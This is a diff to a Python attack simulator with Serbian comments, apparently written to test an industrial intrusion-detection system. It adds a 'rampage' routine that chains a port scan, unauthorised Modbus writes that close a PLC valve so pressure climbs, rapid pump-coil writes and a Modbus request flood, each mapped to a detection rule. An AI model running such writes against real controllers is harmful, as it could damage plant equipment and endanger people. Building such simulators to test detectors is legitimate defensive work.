@@ -7,6 +7,7 @@ Napadi (biraju se preko env ATTACK):
   write    -> neovlasceni Modbus upis u pumpu      -> RULE-007 (+ korelacija)
   pressure -> zatvori ventil PLC2, digni pritisak  -> RULE-007 + RULE-008 (korelacija -> CRITICAL)
   flood    -> rafal Modbus zahteva                 -> RULE-004
+  rampage  -> PUN napad: sve zaredom, neke ponovljeno (svi alarmi + count)
   all      -> scan + write
 
 Radi samo kad se pusti (za testove), nije stalni servis.
@@ -73,17 +74,13 @@ async def unauthorized_write():
 
 async def pressure_attack():
     """
-    Napad 3 (NOVI): sabotaza PLC2. Napadac pise DIREKTNO u PLC2 (zaobilazi
-    SCADA lanac), zatvara ventil, cime pritisak pocinje da raste ka opasnom.
+    Napad 3: sabotaza PLC2. Napadac pise DIREKTNO u PLC2 (zaobilazi SCADA
+    lanac), zatvara ventil, cime pritisak pocinje da raste ka opasnom.
 
     Sta sistem uhvati:
       - RULE-007: upis u PLC koji NE dolazi od SCADA (.30) -> neovlascen
       - RULE-008: pritisak presao opasan prag (procesna posledica)
       - Korelacija: oba u istom prozoru + promena Ventil.Otvoren -> CRITICAL
-
-    Ovo je scenario koji MREZA SAMA ne vidi kao kritican: upis izgleda kao
-    obican Modbus write; tek procesni kontekst (pritisak skace) otkriva
-    koliko je opasan. To je dokaz Tvrdnje 1.
     """
     print(f"[NAPADAC] Sabotaza PLC2 ({TARGET2}:502): zatvaram ventil...")
     client = AsyncModbusTcpClient(TARGET2, port=502)
@@ -92,12 +89,9 @@ async def pressure_attack():
         print(f"[NAPADAC]   ne mogu da se povezem na PLC2 {TARGET2}")
         return
 
-    # Zatvori ventil (0) -> pritisak raste. Drzimo zatvoreno i pratimo.
     await client.write_coil(COIL_VENTIL, False)
     print("[NAPADAC]   ventil ZATVOREN — pritisak ce rasti ka opasnom")
 
-    # Par puta ponovi upis zatvaranja, da ostane zatvoreno i da bude
-    # jasan neovlasceni saobracaj, dok pritisak ne predje prag.
     for i in range(6):
         await asyncio.sleep(3)
         await client.write_coil(COIL_VENTIL, False)
@@ -109,11 +103,8 @@ async def pressure_attack():
 
 async def flood():
     """
-    Napad 4 (NOVI): volumetrijski flood. Rafal Modbus read zahteva na PLC
-    bez pauze -> jedan tok sa ogromnim brojem paketa -> RULE-004.
-
-    Broj zahteva biramo tako da sigurno predje prag (300), a da normalan
-    HMI/SCADA saobracaj (desetine paketa) nikad ne dodje blizu.
+    Napad 4: volumetrijski flood. Rafal Modbus read zahteva na PLC bez pauze
+    -> jedan tok sa ogromnim brojem paketa -> RULE-004.
     """
     broj = int(os.environ.get("FLOOD_COUNT", "1000"))
     print(f"[NAPADAC] Flood: {broj} Modbus zahteva na {TARGET}:502 bez pauze...")
@@ -138,6 +129,52 @@ async def flood():
           f"(~{broj/trajanje:.0f} zahteva/s)")
 
 
+async def rampage():
+    """
+    BOGAT napad za demonstraciju: izvodi vise napada zaredom, neke i
+    ponovljeno, da se aktiviraju SVI alarmi i da count (dedup) poraste.
+
+    Redosled je namerno takav da:
+      - scan se ponovi (RULE-006 count > 1)
+      - neovlasceni upisi idu BRZO (unutar 60s dedup prozora) -> RULE-007 count > 1
+      - pressure sabotira PLC2 -> RULE-007 + RULE-008 + korelacija
+      - flood -> RULE-004
+      - sve vreme napadac prica sa PLC -> RULE-001 (nov uredjaj) + RULE-002
+    """
+    print("[NAPADAC] === RAMPAGE: pun napad ===")
+
+    # 1) Port scan (RULE-006)
+    await port_scan()
+    await asyncio.sleep(2)
+
+    # 2) Scan JOS jednom brzo -> RULE-006 count raste (isti izvor/odrediste)
+    print("[NAPADAC] Ponovni scan (za count)...")
+    await port_scan()
+    await asyncio.sleep(2)
+
+    # 3) Sabotaza ventila PLC2 -> RULE-007 + RULE-008 + korelacija (glavni scenario)
+    await pressure_attack()
+    await asyncio.sleep(2)
+
+    # 4) Neovlasceni upisi u pumpe PLC1, BRZO (unutar dedup prozora 60s)
+    #    -> RULE-007 count raste. Namerno bez velikog razmaka.
+    print("[NAPADAC] Rafal neovlascenih upisa u pumpe (za count)...")
+    client = AsyncModbusTcpClient(TARGET, port=502)
+    await client.connect()
+    if client.connected:
+        for i in range(5):
+            await client.write_coil(COIL_PUMPA1, i % 2 == 0)
+            print(f"[NAPADAC]   upis u pumpu {i+1}/5")
+            await asyncio.sleep(2)  # blizu -> dedup broji, count raste
+        client.close()
+
+    # 5) Flood (RULE-004)
+    await asyncio.sleep(2)
+    await flood()
+
+    print("[NAPADAC] === RAMPAGE gotov ===")
+
+
 async def main():
     attack = os.environ.get("ATTACK", "all")
 
@@ -153,6 +190,9 @@ async def main():
 
     if attack == "flood":
         await flood()
+
+    if attack == "rampage":
+        await rampage()
 
     print("[NAPADAC] Svi napadi zavrseni.")
 
